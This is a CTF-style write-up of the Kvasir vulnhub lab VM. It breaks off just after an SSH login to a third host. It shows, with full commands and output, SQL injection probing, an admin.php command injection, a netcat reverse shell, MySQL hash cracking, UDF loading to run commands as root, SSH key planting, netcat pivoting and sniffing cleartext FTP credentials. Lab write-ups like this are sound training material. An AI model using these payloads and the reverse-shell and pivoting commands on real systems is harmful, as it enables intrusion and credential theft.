<p><img class="right <a" src="href="https://i.imgur.com/gHw2Q50.gif">https://i.imgur.com/gHw2Q50.gif</a>"> Kvasir is <em>extremely</em> well polished, and it can be seen throughout the VM that <a href="https://twitter.com/_RastaMouse">@_RastaMouse</a> has gone through a lot of effort to make every challenge as rewarding as possible. From exploiting simple web based vulnerabilities to service misconfigurations, traffic sniffing, steganography, forensics and cryptopraphy, Kvasir has it all! Solving it also had me make really heavy use of good old netcat.</p>

<p>This writeup details the path I took to read the final flag :)</p>

<!-- more -->


<h2>a usual start</h2>

<p>Before we start off though, I feel its important to touch base on tunneling techniques used. All of the tunneling was done either via netcat, or via a SSH socks proxy. The socks proxies were accessed using <code>proxychains</code>, and I was editing <code>/etc/proxychains.conf</code> to match the port of the proxy I needed to use to reach my desired destination.</p>

<p>With that out the way, lets start.<br/>
Almost all of the boot2roots have a discovery phase. After downloading the archive from <a href="http://vulnhub.com">vulnhub.com</a>, I ran a ping scan in the subnet that my host-only network lives in. It returned with no results, and I realized there may already be more to this than anticipated. I engaged <em>lazy mode</em>™ and checked what the VirtualBox session showed the IP was:</p>

<p><img class="<a" src="href="https://i.imgur.com/ZTj0D3h.png">https://i.imgur.com/ZTj0D3h.png</a>"></p>

<p><strong>192.168.56.102</strong>. Sweet, throwing <code>nmap</code> at it showed only <code>tcp/80</code> as open.</p>

<p>```bash
root@kali:~# nmap 192.168.56.102</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-11-09 11:07 SAST
Nmap scan report for 192.168.56.102
Host is up (0.000061s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 08:00:27:CF:5D:57 (Cadmus Computer Systems)</p>

<p>Nmap done: 1 IP address (1 host up) scanned in 0.20 seconds
```</p>

<h2>fink ur gud enuf?</h2>

<p>Browsing to the IP using Iceweasel, we see a login portal presented to us:</p>

<p><img class="<a" src="href="https://i.imgur.com/vUSSRt7.png">https://i.imgur.com/vUSSRt7.png</a>"></p>

<p>I made a few attempts at guessing a login, and eventually just threw a <code>'</code> at the username field:</p>

<p><img class="<a" src="href="https://i.imgur.com/gVb0iK7.png">https://i.imgur.com/gVb0iK7.png</a>"></p>

<p>I had a instant troll alert and figured it can&rsquo;t be <em>that</em> easy!? Changing the username payload from <code>'</code> to <code>' OR 1=1 LIMIT 1--</code> with a random word as a password, resulted in the application returning a <code>403</code> type response. I figured that something strange was going on here, and fired up <a href="http://portswigger.net/burp/">Burp Suite</a> to have a look under the hood at what is happening. As seen in the web browser, the web server really does respond with a HTTP 403:</p>

<p><img class="<a" src="href="https://i.imgur.com/mAxhkaG.png">https://i.imgur.com/mAxhkaG.png</a>"></p>

<p>Moving on to the register page. Registration required a username and password, as well as a date of birth. I registered <code>bob:bob</code> with a DoB of <code>09/09/09</code>, and attempted to login with the credentials:</p>

<p><img class="<a" src="href="https://i.imgur.com/o9Utreq.png">https://i.imgur.com/o9Utreq.png</a>"></p>

<p>Not a very useful web application so far, but nonetheless, I figured there is something I am not seeing yet. I went back to the registration page and attempted some SQLi payloads there. The form definitely seemed vulnerable to SQLi, and I managed to uncover a part of the backend query as <code>'a', 'a', 0, NULL)</code>. Considering this was a new account registration page, my guess was that this was part of a <code>INSERT</code> query:</p>

<p><img class="<a" src="href="https://i.imgur.com/DA1Xe5H.png">https://i.imgur.com/DA1Xe5H.png</a>"></p>

<p>It was about at this time where that thing called real life started to interfere and drive my attention away from Kvasir. While working, I decided to run trusty &lsquo;ol <code>wfuzz</code> on the web service to see if there was anything interesting to reveal:</p>

<p>```bash
root@kali:~# wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/medium.txt  &mdash;hc 404 <a href="http://192.168.56.102/FUZZ.php">http://192.168.56.102/FUZZ.php</a></p>

<hr />

<ul>
<li>Wfuzz  2.0 &ndash; The Web Bruteforcer                     *</li>
</ul>


<hr />

<p>Target: <a href="http://192.168.56.102/FUZZ.php">http://192.168.56.102/FUZZ.php</a>
Payload type: file,/usr/share/wordlists/wfuzz/general/medium.txt</p>

<h1>Total requests: 1660</h1>

<h1>ID  Response   Lines      Word         Chars          Request    </h1>

<p>00077:  C=302     16 L        34 W      365 Ch    &ldquo; &ndash; admin&rdquo;
00302:  C=403     10 L        30 W      294 Ch    &ldquo; &ndash; cgi-bin/&rdquo;
00394:  C=403     10 L        30 W      292 Ch    &ldquo; &ndash; create&rdquo;
00455:  C=403     10 L        30 W      294 Ch    &ldquo; &ndash; descarga&rdquo;
00457:  C=403     10 L        30 W      296 Ch    &ldquo; &ndash; descarrega&rdquo;
00463:  C=403     10 L        30 W      298 Ch    &ldquo; &ndash; descarregues&rdquo;
00741:  C=200     20 L        44 W      464 Ch    &ldquo; &ndash; index&rdquo;
00894:  C=403     10 L        30 W      290 Ch    &ldquo; &ndash; load&rdquo;
00901:  C=302      0 L         0 W        0 Ch    &ldquo; &ndash; login&rdquo;
00904:  C=302      0 L         0 W        0 Ch    &ldquo; &ndash; logout&rdquo;
00964:  C=302     15 L        16 W      168 Ch    &ldquo; &ndash; member&rdquo;
01247:  C=200     17 L        39 W      426 Ch    &ldquo; &ndash; register&rdquo;
01331:  C=403     10 L        30 W      292 Ch    &ldquo; &ndash; select&rdquo;
01432:  C=200      0 L         0 W        0 Ch    &ldquo; &ndash; submit&rdquo;
01556:  C=403     10 L        30 W      292 Ch    &ldquo; &ndash; update&rdquo;
01565:  C=403     10 L        30 W      293 Ch    &ldquo; &ndash; updates&rdquo;
```</p>

<p>Woa, thats quite a bit of results to work through eh :)</p>

<h2>admins only want to 302 here</h2>

<p>Of everything <code>wfuzz</code> revealed to us, <code>admin.php</code> was the most interesting one. Watching Burp as the requests went up and down, I noticed that <code>admin.php</code> would return a HTTP 302 code with a location, along with an actual body:</p>

<p><img class="<a" src="href="https://i.imgur.com/exdmq5A.png">https://i.imgur.com/exdmq5A.png</a>"></p>

<p>Sweet! I modified the response in Burp to return <code>200</code> instead, and removed the <code>Location:</code> header. We now had a new page to work with :)</p>

<p><img class="<a" src="href="https://i.imgur.com/6WoT1x2.png">https://i.imgur.com/6WoT1x2.png</a>"></p>

<p>The form hints that we can check the service status of daemons running on the underlying OS, and suggests <code>apache2</code> as input. I submitted the form with <code>apache2</code> as the service, and got back a response (that also tried to 302 but I fixed that :D) with a new section <code>Apache2 is running (pid 1330).</code>. This just <strong>screams</strong> command injection doesn’t it?</p>

<h2>command injection</h2>

<p>In order for me to fuzz this further, I took the request to trusty &lsquo;ol <code>curl</code>. While doing this, I realized that <code>admin.php</code> did no checks to ensure that we are authenticated or anything. We could simply submit <code>service=&lt;payload&gt;</code> as a POST to <code>admin.php</code> and get output:</p>

<p>```bash
root@kali:~# curl &lsquo;<a href="http://192.168.56.102/admin.php">http://192.168.56.102/admin.php</a>&rsquo; &mdash;data &lsquo;service=apache2;&rsquo;</p>

<p><html>
<body></p>

<p><div align="center"></p>

<p><h1>Service Check</h1></p>

<p><form name="service" method="post" action="">
<input name="service" id="service" type="text" placeholder="apache2" /><br /><br />
<input name="submit" id="submit" type="submit" value="Submit" />
</form></p>

<p><form action="logout.php" method="post">
<input type="submit" value="Logout" />
</form></p>

<p><pre>Usage: /etc/init.d/apache2 {start|stop|graceful-stop|restart|reload|force-reload|start-htcacheclean|stop-htcacheclean|status}.
</pre>
```</p>

<p>Entering <code>apache2;</code> as the input, revealed the first step in our command injection. With <code>apache2;</code> as the payload, I figured that the php script was taking our user input and running with the following pseudo code:</p>

<p>```php
&lt;?php</p>

<p>print system(&ldquo;/etc/init.d/&rdquo; . $_POST[&ldquo;service&rdquo;] . &ldquo; status&rdquo;);
```</p>

<p>So, with our payload, we have modified this to run <code>/etc/init.d/apache2; status</code>, which will fail for obvious reasons! A little more fiddling finally got me to a working payload by posting <code>service=</code> as <code>;echo 'id';</code> where the single quotes are actually back ticks. (octopress grrr)</p>

<p><code>``bash
root@kali:~# curl 'http://192.168.56.102/admin.php' --data 'service=;echo</code>id`;'</p>

<p>[&hellip; snip &hellip;]</p>

<p><pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre>
```</p>

<h2>netcat is our entry into the rabbit hole</h2>

<p>With the command injection now exploitable, I grabbed some skeleton code that I normally use to try and make these types of command execution vulnerabilities slightly easier to work with. The basic premise is to have the command executed, and the response regex&rsquo;d out. This ended up as the following python script:</p>

<p>```python</p>

<h1>!/usr/bin/python</h1>

<h1>Kvasir Command Execution</h1>

<h1>$ python cmd.py &ldquo;uname -a&rdquo;</h1>

<h1>Command to run: uname -a</h1>

<h1></h1>

<h1>Linux web 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64 GNU/Linux</h1>

<p>import requests
import re
import sys
import os
import binascii</p>

<p>print &lsquo;Command to run: %s&rsquo; % sys.argv[1]</p>

<h1>generate 2 random strings so that we can regex out the command output</h1>

<p>command_start = binascii.b2a_hex(os.urandom(30))
command_end = binascii.b2a_hex(os.urandom(30))</p>

<h1>prepare something that we can regex out</h1>

<p>params = {&lsquo;service&rsquo; : &lsquo;;echo %s; echo <code>%s</code>; echo %s;&rsquo; % (command_start, sys.argv[1], command_end) }</p>

<h1>fetch, ignoring the troll redirect</h1>

<p>r = requests.post(&lsquo;<a href="http://192.168.56.102/admin.php">http://192.168.56.102/admin.php</a>&rsquo;, params, allow_redirects=False)</p>

<h1>match regex and print</h1>

<p>print  re.findall(r'%s([^|]+)%s' % (command_start, command_end), r.text)[0].replace(&lsquo;\n%s\n&rsquo; % command_end,&lsquo;&rsquo;)
```</p>

<p>So, now I can just run <code>python cmd.py "id"</code> and get the output (the <em>(kvasir)</em> in front of my prompt is my python virtualenv where I installed the <code>requests</code> dependency):</p>

<p>```bash
(kvasir)root@kali:~# python cmd.py &ldquo;id&rdquo;
Command to run: id</p>

<p>uid=33(www-data) gid=33(www-data) groups=33(www-data)
```</p>

<p>And so, initial enumeration was done. Immediately I noticed that this host had 2 network interfaces. <strong>192.168.1.100</strong> and <strong>192.168.2.100</strong>. No sign of <strong>192.168.56.102</strong> here&hellip; It also seemed like I would be able to build a netcat shell out of this environment to my attacking host, so I set up a listener with <code>nc -lvp 4444</code>, and connected to it using my <code>cmd.py</code> script <code>python cmd.py "/bin/nc 192.168.56.101 4444 -e /bin/bash"</code>:</p>

<p><code>bash
root@kali:~# nc -lvp 4444
listening on [any] 4444 ...
192.168.56.102: inverse host lookup failed: Unknown server error : Connection timed out
connect to [192.168.56.101] from (UNKNOWN) [192.168.56.102] 53516
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
</code></p>

<p>So, in order to make sure we don&rsquo;t lose our place, consider the following simple diagram showing the network paths for gaining first shell access to the host <code>web</code>:</p>

<p><img class="<a" src="href="https://i.imgur.com/Q2rSi2G.png">https://i.imgur.com/Q2rSi2G.png</a>"></p>

<p>The only public presence of the internal network is therefore the originally discovered <strong>192.168.56.102</strong> IP address.</p>

<h2>my-see-qual as root deserves a slap on the wrist</h2>

<p>With semi interactive shell access using <code>netcat</code> to <strong>web</strong> (192.168.1.100), some more enumeration was done. Most importantly, the sources serving the web site that I have exploited to gain a command shell revealed credentials and a host of a MySQL instance. Consider the following extract from <code>member.php</code>:</p>

<p>```php
&lt;?php</p>

<p>session_start();</p>

<p>if (!isset($_SESSION[&ldquo;member&rdquo;])) {</p>

<pre><code>header("Location: index.php");
</code></pre>

<p>}</p>

<p>$user = $_SESSION[&ldquo;username&rdquo;];</p>

<p>mysql_connect(&ldquo;192.168.2.200&rdquo;, &ldquo;webapp&rdquo;, &ldquo;webapp&rdquo;) or die(mysql_error());
mysql_select_db(&ldquo;webapp&rdquo;) or die(mysql_error());</p>

<p>$query = &ldquo;SELECT dob FROM users WHERE username=&lsquo;$user&rsquo;&rdquo;;
$result = mysql_query($query) or die(mysql_error());</p>

<p>?>
[&hellip; snip &hellip;]
```</p>

<p>So mysql access with <code>webapp:webapp</code> at 192.168.2.200. Lets test this and check out the server. I executed commands using mysql -e on the netcat shell that just spawned:</p>

<p><code>bash
mysql -uwebapp -pwebapp -h 192.168.2.200 -e 'show grants;'
Grants for webapp@192.168.2.100
GRANT SELECT, INSERT ON *.* TO 'webapp'@'192.168.2.100' IDENTIFIED BY PASSWORD '*BF7C27E734F86F28A9386E9759D238AFB863BDE3'
GRANT ALL PRIVILEGES ON `webapp`.* TO 'webapp'@'192.168.2.100'
</code></p>

<p>So I can select anywhere. Nice :)</p>

<p><code>bash
mysql -uwebapp -pwebapp -h 192.168.2.200 -e 'use webapp; show tables;'
Tables_in_webapp
todo
users
mysql -uwebapp -pwebapp -h 192.168.2.200 -e 'use webapp; select * from todo;'
task
stop running mysql as root
</code></p>

<p>A table called <code>todo</code> exists, with a string <code>stop running mysql as root</code>. That was the first hint and immediately had me thinking about <a href="http://www.mysqludf.org/">MySQL UDF</a>&rsquo;s, one which could allow us to run system commands. However, in order to get a UDF loaded, I will need a dba level account, one which I don&rsquo;t have yet. From the previous grants output, I can see that I am allowed to query any table on the database server, so lets get some administrative hashes:</p>

<p><code>bash
mysql -uwebapp -pwebapp -h 192.168.2.200 -e 'use mysql; select DISTINCT User,Password from user;'
User    Password
root    *ECB01D78C2FBEE997EDA584C647183FD99C115FD
debian-sys-maint    *E0E0871376896664A590151D348CCE9AA800435B
webapp  *BF7C27E734F86F28A9386E9759D238AFB863BDE3
</code></p>

<p>As a side note, further enumeration of the PHP sources and MySQL table <code>users</code> showed that if we injected SQL on the registration page to add a extra <code>1</code>, we would be considered an admin, and would have also seen the admin page that is vulnerable to the already found command injection.</p>

<h3>cracking root&rsquo;s MySQL password</h3>

<p>Now that I had the password hash for the root user, I proceeded to try and crack it. For this I used <code>hashcat</code> with the ever famous <code>rockyou</code> wordlist:</p>

<p>```bash</p>

<h1>first, echo the hash to a file</h1>

<p>root@kali:~# echo &ldquo;ECB01D78C2FBEE997EDA584C647183FD99C115FD&rdquo; > db.root</p>

<h1>next, we tell hash cat the type of hash we have and wait a few seconds :)</h1>

<p>root@kali:~# hashcat -m 300 db.root /usr/share/wordlists/rockyou.txt
This copy of hashcat will expire on 01.01.2015. Please upgrade to continue using hashcat.</p>

<p>Initializing hashcat v0.47 by atom with 8 threads and 32mb segment-size&hellip;</p>

<p>Added hashes from file db.root: 1 (1 salts)
Activating quick-digest mode for single-hash</p>

<p>NOTE: press enter for status-screen</p>

<p>ecb01d78c2fbee997eda584c647183fd99c115fd:coolwater</p>

<p>All hashes have been recovered</p>

<p>Input.Mode: Dict (/usr/share/wordlists/rockyou.txt)
Index&hellip;..: 1/5 (segment), 3627099 (words), 33550339 (bytes)
Recovered.: 1/1 hashes, 1/1 salts
Speed/sec.: &ndash; plains, 3.27M words
Progress..: 281260/3627099 (7.75%)
Running&hellip;: &mdash;:&mdash;:&mdash;:&mdash;
Estimated.: 00:00:00:01</p>

<p>Started: Sun Nov  9 14:07:14 2014
Stopped: Sun Nov  9 14:07:14 2014
```</p>

<p>The password for the MySQL <code>root</code> user is therefore <code>coolwater</code>:</p>

<p><code>bash
mysql -uroot -pcoolwater -h 192.168.2.200 -e 'show grants;'
Grants for root@192.168.2.100
GRANT ALL PRIVILEGES ON *.* TO 'root'@'192.168.2.100' IDENTIFIED BY PASSWORD '*ECB01D78C2FBEE997EDA584C647183FD99C115FD' WITH GRANT OPTION
</code></p>

<h3>loading the UDF remotely</h3>

<p>With a full dba level account, it was time to get the UDF loaded. My initial approach for this failed pretty badly to start off with.</p>

<p>I grabbed a copy of a <code>do_system()</code> UDF that I have previously used successfully from <a href="http://www.0xdeadbeef.info/exploits/raptor_udf.c">here</a>, called <code>raptor_udf.c</code>. Considering the host operating system was 64bit, and my attacking machine was 32bit, I opted to compile the UDF on the <code>web</code> host. Compilation was done on the <code>web</code> host with:</p>

<p><code>bash
gcc -g -c raptor_udf.c -fPIC
gcc -g -shared -Wl,--soname,raptor_udf.so -o raptor_udf.so raptor_udf.o -lc
</code></p>

<p>This resulted in a raptor_udf.so file, which was ready to be uploaded to the server. Now, the word <code>uploading</code> sounds trivial, however its not. I need to know <em>where</em> to first. For this, I enumerate the MySQL <code>plugin_dir</code>:</p>

<p><code>bash
mysql -uroot -pcoolwater -h 192.168.2.200 -e 'select @@plugin_dir;'
@@plugin_dir
/usr/lib/mysql/plugin/
</code></p>

<p>So this means I need to write the udf to <code>/usr/lib/mysql/plugin/raptor_udf.so</code>. Fair enough. But how do I write this? Well there are many approaches to this. One is to use <code>--local-infile=1</code> as a flag on the local mysqlclient (needs to be allowed server side too), to actually upload the <strong>local</strong> file to wherever (a table in our case) and then to a file via <code>INTO DUMPFILE</code>. The other option is to simply convert the content to hex, and run <code>SELECT 0x</code> + <code>&lt;CONTENT AS HEX&gt;</code> + <code>INTO DUMPFILE /usr/lib/mysql/plugin/raptor_udf.so</code>.</p>

<p>I opted for the content encoding as hex and generated a <code>xxd</code> output of the compiled <code>raptor_udf.so</code>. With this uploaded, I came to the section where the function was to be created, and this is where I got stuck. I would simply get a error along the likes of <code>Undefined Symbol "do_system" in raptor_udf.so</code>. :\</p>

<p>Eventually, I opted to find a precompiled 64bit <code>.so</code> to upload, and found one in the <a href="https://github.com/sqlmapproject/sqlmap/blob/master/udf/mysql/linux/64/lib_mysqludf_sys.so">sqlmap repository</a>. I downloaded this and converted it to hex using <code>xxd</code>. I then created the following file with the mysql commands to run on the <code>web</code> host from my attacking machine:</p>

<p>```bash
root@kali:~# cat load_udf.sh
touch log
mysql -uroot -pcoolwater -h 192.168.2.200 -e &lsquo;use mysql; select 0x7f454</p>

<pre><code>[... snip ... but the this the output of xxd -p lib_mysqludf_sys.so ]
</code></pre>

<p>0000000000000 into dumpfile &ldquo;/usr/lib/mysql/plugin/raptor_udf.so&rdquo;;&lsquo; 2>> log
mysql -uroot -pcoolwater -h 192.168.2.200 -e 'create function sys_exec returns integer soname &ldquo;raptor_udf.so&rdquo;;&rsquo; 2>> log
mysql -uroot -pcoolwater -h 192.168.2.200 -e &lsquo;use mysql; select * from mysql.func;&rsquo; 2>> log</p>

<h1>this adds me a SSH key to roots authorized keys using the command execution udf we have prepared</h1>

<p>mysql -uroot -pcoolwater -h 192.168.2.200 -e &lsquo;select sys_exec(&ldquo;echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPzHgBKct5VjcxsoGfzL/g2XfOk6k6vhHxS4V1C4x0483V29E5OhEDSW/3pfJVwv9m/BW1aXJe5sLO3G3kn0VhgEen+YHShXu09cv3ROu98krlwYcmzyMyfZdwU0D2DbIJjFKWaqEafIcLx01vmFozcxk3C1bhPdo6mBuu2XGWJx6OpqXYnnRGebXdBqKT9b5JmEVn/W8Vu9F68nqmIYyk3hBlydwbOkevh/HfsNm50pd7ZZPK/mpAdZxYYxfBcvUQcWmgtw49ihTAJGh5KZJM/pL4xCw/meavFXy01SX7TZNAmrxcn6FDcXQJ6DC+TUMWXigxcCwntKxSHChyTiDB\&rdquo; > /root/.ssh/authorized_keys")&rsquo; 2>> log
```</p>

<p>With this file ready, I opened a netcat port to pipe it to, and read it on <code>web</code>:</p>

<p>```bash</p>

<h1>on the attacking machine, I opened netcat with my mysql commands</h1>

<p>root@kali:~# nc -lvp 4444 &lt; load_udf.sh
listening on [any] 4444 &hellip;</p>

<h1>then on the original netcat shell I have, read it</h1>

<p>timeout 3 nc 192.168.56.101 4444 | sh
name    ret dl  type
sys_exec    2   raptor_udf.so   function
sys_exec(&ldquo;echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPzHgBKct5VjcxsoGfzL/g2XfOk6k6vhHxS4V1C4x0483V29E5OhEDSW/3pfJVwv9m/BW1aXJe5sLO3G3kn0VhgEen+YHShXu09cv3ROu98krlwYcmzyMyfZdwU0D2DbIJjFKWaqEafIcLx01vmFozcxk3C1bhPdo6mBuu2XGWJx6OpqXYnnRGebXdBqKT9b5JmEVn/W
0
```</p>

<p>The public ssh key is sourced from a new key pair I generated for Kvasir. So, with that run we get a exit code of <code>0</code>, indicating that it was successful. I specify the <code>timeout</code> command so that the nc session opened from within another nc session will exit and we don’t lose the shell. Pressing ^C will kill the whole session and not just the netcat I just run :)</p>

<h2>ssh to db host</h2>

<p>With all that done, I have my public key for the <code>root</code> user added, and I should be able to ssh to it. There is one interesting hurdle though, how do I <em>get</em> to 192.168.2.200&rsquo;s port 22? :)</p>

<p>For that, I decided to look at <code>netcat</code> port forwarding! But first, lets read some man pages:</p>

<p>```bash</p>

<h1>from nc(1)</h1>

<p>OPTIONS</p>

<pre><code>   -c string    specify shell commands to exec after connect (use with caution).
</code></pre>

<p>```</p>

<p><em>&ldquo;use with caution&rdquo;</em>. I like it already. Ok so I can open a netcat listener, which will open another one on connect listening on a new port. We can then connect to this listener, opening another connection to the ssh server we want to connect to, effectively forwarding the port. Clear as mud!</p>

<p><img class="<a" src="href="https://i.imgur.com/7IggbMC.jpg">https://i.imgur.com/7IggbMC.jpg</a>"></p>

<p>Lets see this in action. First I setup the initial listener on the attacking machine:</p>

<p>```bash</p>

<h1>listen on tcp/4444, re-listening on tcp/222 on a new connection</h1>

<p>root@kali:~# nc -lvp 4444 -c &ldquo;nc -lvp 222&rdquo;
listening on [any] 4444 &hellip;
```</p>

<p>With the listener setup, lets issue a new <code>nc</code> command in the initial shell that I got on <code>web</code>, connecting the dots:</p>

<p><code>bash
nc 192.168.56.101 4444 -c "nc 192.168.2.200 22"
</code></p>

<p>When this runs, the initial listener will see the new connection, and I should have the <code>tcp/22</code> of <strong>192.168.2.200</strong> now forwarded locally:</p>

<p>```bash
root@kali:~# nc -lvp 4444 -c &ldquo;nc -lvp 222&rdquo;
listening on [any] 4444 &hellip;</p>

<h1>connection comes in from 192.168.1.100</h1>

<p>192.168.56.102: inverse host lookup failed: Unknown server error : Connection timed out
connect to [192.168.56.101] from (UNKNOWN) [192.168.56.102] 53870
listening on [any] 222 &hellip;
```</p>

<p>Lets take a look at a updated network diagram, detailing where I am in the network now. The new port forward is denoted in red:</p>

<p><img class="<a" src="href="https://i.imgur.com/A2463Kc.png">https://i.imgur.com/A2463Kc.png</a>"></p>

<p>Lets try and SSH in with the key pair that I generated and loaded using the MySQL UDF:</p>

<p>```bash
root@kali:~# ssh -D 8000 <a href="&#x6d;&#x61;&#105;&#x6c;&#x74;&#111;&#58;&#114;&#x6f;&#111;&#x74;&#x40;&#x31;&#50;&#55;&#x2e;&#48;&#46;&#x30;&#x2e;&#x31;">&#x72;&#111;&#111;&#116;&#64;&#x31;&#x32;&#55;&#46;&#x30;&#x2e;&#48;&#x2e;&#49;</a> -p222 -i kvasir_key
Linux db 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64</p>

<p>The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.</p>

<p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Nov  9 07:13:17 2014 from 192.168.2.100
root@db:~#
```</p>

<p>I added the <code>-D</code> option so that I may have a socks proxy to work with should any further tunneling be required. This means now that with the SSH session built, I have a <em>almost</em> <em>direct</em> connection to the <code>db</code> (192.168.2.200) host, as denoted in green below:</p>

<p><img class="<a" src="href="https://i.imgur.com/wHNJJ5g.png">https://i.imgur.com/wHNJJ5g.png</a>"></p>

<p>8-)</p>

<h2>not exactly nsa level spying but heh</h2>

<p>Initial enumeration revealed that this host (<code>db</code>) had 2 network interfaces. One with IP <strong>192.168.2.200</strong> (the one I came in from), and another with IP <strong>192.168.3.200</strong>. There were also 2 entries in <code>/etc/hosts</code> about 2 hosts in the 3.x network:</p>

<p>```bash
root@db:~# cat /etc/hosts</p>

<h1>192.168.3.40  celes</h1>

<h1>192.168.3.50  terra</h1>

<p>[&hellip; snip &hellip;]
```</p>

<p>The host was also running a mysql server (the one we pwnd), and a pure-ftpd server:</p>

<p><code>bash
root@db:~# ps -ef
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 Nov08 ?        00:00:00 init [3]  
root      1242     1  0 Nov08 ?        00:00:00 dhclient -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases eth0
root      1408     1  0 Nov08 ?        00:00:00 /usr/sbin/sshd
root      1434     1  0 Nov08 ?        00:00:00 /bin/sh /usr/bin/mysqld_safe
root      1761  1434  0 Nov08 ?        00:00:37 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=root --pid-file=/var/run/mysqld/mysqld
root      1762  1434  0 Nov08 ?        00:00:00 logger -t mysqld -p daemon.error
root      1861     1  0 Nov08 ?        00:00:00 pure-ftpd (SERVER)
[... snip ...]
</code></p>

<p>A interesting file was in <code>/root/.words.txt</code>, which contained some random words, some of which i recognized as nicks in #vulnhub on freenode.</p>

<p><code>bash
root@db:~# head /root/.words.txt
borne
precombatting
noncandescent
cushat
lushness
precensure
romishness
nonderivable
overqualification
superkojiman
</code></p>

<p>And finally, a troll flag :D</p>

<p><code>bash
root@db:~# cat /root/flag
This is not the flag you're looking for... :p
</code></p>

<p>This was the first time I was really stuck on Kvasir. After quite a bit of poking around, I noticed a user <code>celes</code> in <code>/etc/pure-ftpd/pureftpd.passwd</code>, with a password that I was not able to crack. The host itself did not have this user configured either. I was starting to think that this server has nothing really to offer in the form of post exploitation and started planning exploration of neighboring hosts and their network services.</p>

<p>At one stage, I was checking to see what network activity was present on the interfaces, of which <code>eth0</code> had my SSH session, and <code>eth1</code> was quiet. At least, until I was about to close the tcpdump I had this sudden burst of packets:</p>

<p>```bash
root@db:~# tcpdump -i eth1
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth1, link-type EN10MB (Ethernet), capture size 65535 bytes
13:19:01.355970 IP 192.168.3.40.36425 > 192.168.3.200.<a href="ftp:">ftp:</a> Flags [S], seq 2471029534, win 14600, options [mss 1460,sackOK,TS val 13092832 ecr 0,nop,wscale 5], length 0
13:19:01.355988 IP 192.168.3.200.ftp > 192.168.3.40.36425: Flags [S.], seq 2507516314, ack 2471029535, win 14480, options [mss 1460,sackOK,TS val ack 535, win 490, options [nop,nop,TS val 13092837 ecr 13092836], length 0</p>

<p>[&hellip; snip &hellip;]</p>

<p>13:19:01.378604 IP 192.168.3.200.ftp > 192.168.3.40.36425: Flags [P.], seq 535:548, ack 53, win 453, options [nop,nop,TS val 13092837 ecr 13092837], length 13
13:19:01.378631 IP 192.168.3.40.36425 > 192.168.3.200.<a href="ftp:">ftp:</a> Flags [R], seq 2471029587, win 0, length 0
^C
29 packets captured
29 packets received by filter
0 packets dropped by kernel
```</p>

<p>I changed the command to add the <code>-X</code> flag as this looked like FTP traffic flowing over the interface (you haven&rsquo;t forgotten the ftp server yet have you?).</p>

<p>```bash
13:25:01.387981 IP 192.168.3.200.ftp > 192.168.3.40.36437: Flags [P.], seq 321:359, ack 13, win 453, options [nop,nop,TS val 13182840 ecr 13182839], length 38</p>

<pre><code>0x0000:  4510 005a 7e22 4000 4006 342b c0a8 03c8  E..Z~"@.@.4+....
0x0010:  c0a8 0328 0015 8e55 1bf0 5a96 015a 5499  ...(...U..Z..ZT.
0x0020:  8018 01c5 42a1 0000 0101 080a 00c9 2778  ....B.........'x
0x0030:  00c9 2777 3333 3120 5573 6572 2063 656c  ..'w331.User.cel
0x0040:  6573 204f 4b2e 2050 6173 7377 6f72 6420  es.OK..Password.
0x0050:  7265 7175 6972 6564 0d0a                 required..
</code></pre>

<p>13:25:01.388050 IP 192.168.3.40.36437 > 192.168.3.200.<a href="ftp:">ftp:</a> Flags [P.], seq 13:32, ack 359, win 490, options [nop,nop,TS val 13182840 ecr 13182840], length 19</p>

<pre><code>0x0000:  4500 0047 73fe 4000 4006 3e72 c0a8 0328  E..Gs.@.@.&gt;r...(
0x0010:  c0a8 03c8 8e55 0015 015a 5499 1bf0 5abc  .....U...ZT...Z.
0x0020:  8018 01ea a5ae 0000 0101 080a 00c9 2778  ..............'x
0x0030:  00c9 2778 5041 5353 2069 6d32 3242 4634  ..'xPASS.im22BF4
0x0040:  4858 6e30 310d 0a                        HXn01..
</code></pre>

<p>```</p>

<p>A cleartext username and password? Well aint that just handy! :D Just to confirm I wrote a pcap to disk with the <code>-W</code> flag, transferred it to my attacking machine and opened it in Wireshark so that I can inspect the whole FTP conversation.</p>

<p><img class="<a" src="href="https://i.imgur.com/YiwWzsy.png">https://i.imgur.com/YiwWzsy.png</a>"></p>

<p>It seems like <code>celes</code> is simply logging in, getting a directory listing, and logging out.</p>

<p>Taking a long shot, I wondered if the age old problem of password reuse is applicable here, so I tried to ssh in to <strong>192.168.3.40</strong> (the ip the FTP conversation was coming from) using <code>celes:im22BF4HXn01</code>:</p>

<p>```bash
root@db:~# ssh <a href="&#x6d;&#x61;&#x69;&#x6c;&#116;&#x6f;&#58;&#x63;&#101;&#x6c;&#101;&#x73;&#x40;&#49;&#x39;&#50;&#46;&#49;&#x36;&#56;&#46;&#x33;&#x2e;&#x34;&#x30;">&#99;&#101;&#108;&#101;&#x73;&#x40;&#x31;&#57;&#50;&#x2e;&#49;&#x36;&#x38;&#46;&#x33;&#46;&#52;&#x30;</a>
<a href="&#x6d;&#97;&#105;&#108;&#116;&#111;&#x3a;&#99;&#101;&#108;&#101;&#115;&#x40;&#49;&#57;&#x32;&#46;&#49;&#54;&#x38;&#46;&#51;&#46;&#x34;&#x30;">&#99;&#x65;&#x6c;&#101;&#x73;&#64;&#49;&#x39;&#50;&#46;&#49;&#54;&#x38;&#46;&#51;&#x2e;&#52;&#48;</a>&rsquo;s password: # entered im22BF4HXn01
Linux dev1 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64</p>

